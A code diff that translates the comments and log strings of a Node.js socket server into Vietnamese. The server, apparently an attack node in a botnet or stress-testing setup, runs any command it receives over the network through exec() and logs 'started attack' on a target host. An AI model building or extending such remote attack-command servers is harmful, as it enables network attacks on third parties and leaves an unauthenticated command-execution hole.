@@ -24,14 +24,14 @@ const server = net.createServer((socket) => {
                 socket.end();
             }
 
-            //launch attack
+            //khởi động cuộc tấn công
             exec(json.command, function (error, stdout, stderr) {});
 
-            console.log(`started attack on ${json.host}`)
+            console.log(`bắt đầu tấn công vào ${json.host}`)
         
             socket.write('success');
         } catch (e) {
-            console.log(`failed to start a attack ${e}`)
+            console.log(`không bắt đầu tấn công được ${e}`)
         
             socket.write('failed');
             socket.end();
@@ -44,5 +44,5 @@ const server = net.createServer((socket) => {
 });
 
 server.listen(socket_port, () => {
-    console.log(`Server listening on ${socket_port}`);
+    console.log(`Máy chủ đang lắng nghe trên ${socket_port}`);
 });
